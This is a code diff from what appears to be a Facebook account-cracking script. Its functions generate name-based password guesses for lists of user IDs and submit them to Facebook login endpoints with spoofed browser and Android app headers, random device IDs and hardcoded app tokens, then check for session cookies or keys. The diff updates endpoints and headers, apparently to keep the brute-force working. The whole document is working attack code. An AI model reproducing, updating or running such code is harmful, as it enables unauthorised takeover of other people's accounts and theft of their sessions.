@@ -318,7 +318,7 @@ def ffb(ids,names,passlist):
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not=A?Brand";v="24", "Chromium";v="107", "Google Chrome";v="107"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://free.facebook.com/?stype=lo&jlou=AffvDftmt5To1iu1EyYPJow9YjWf5sBizcHFZe352D6OJ-8fOGFuBmvryr2RtnKti1eVRdd46B1fKa7n0lrf2zUoH03MMwlefnpYNOlk33u3lQ&smuh=21668&lh=Ac-wtQ8WtGT9_OF1DlU&ref_component=mbasic_footer&zero_e=2&zero_et=1678164349&_rdc=1&_rdr&refsrc=deprecated')
+                        getlog = session.get(f'https://touch.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Rahul=session.cookies.get_dict().keys()
@@ -478,38 +478,45 @@ def api5(ids,names,passlist):
                                 ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
-                                data = {'adid':adid,
+                                data = {'adid':str(uuid.uuid4()),
                                         'email':ids,
                                         'password':pas,
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
+                                        "family_device_id": str(uuid.uuid4()),
                                         'error_detail_type':'button_with_disabled',
                                         'source':'login','format':'json',
                                         'generate_session_cookies':'1',
+                                        "meta_inf_fbmeta": "",
                                         'generate_analytics_claim':'1',
-                                        'generate_machine_id':'1',
-                                        "locale":"es_CU",
-                                        "client_country_code":"CU",
+                                        "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
+                                        "locale":"en_US","client_country_code":"US",
                                         'device':gtt,
                                         'device_id':str(uuid.uuid4()),
                                         "method": "auth.login",
-                                        "currently_logged_in_userid" : "0",
                                         "fb_api_req_friendly_name": "authenticate",
+                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+                                        
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'mobile.LTE',
+                                        'x-fb-sim-hni':'45201',
+                                        'x-fb-connection-type':'MOBILE.LTE',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':'Mozilla/5.0 (Linux; U; Android 4.2.2; fr-fr; TECNO H5 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'user-agent':ua,
+                                        'Host': 'graph.facebook.com', 
+                                        'x-fb-net-hni':'45204',
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
+                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                                        'x-fb-device-group': '5120',
+                                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
+                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                url = ' https://b-api.facebook.com/method/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
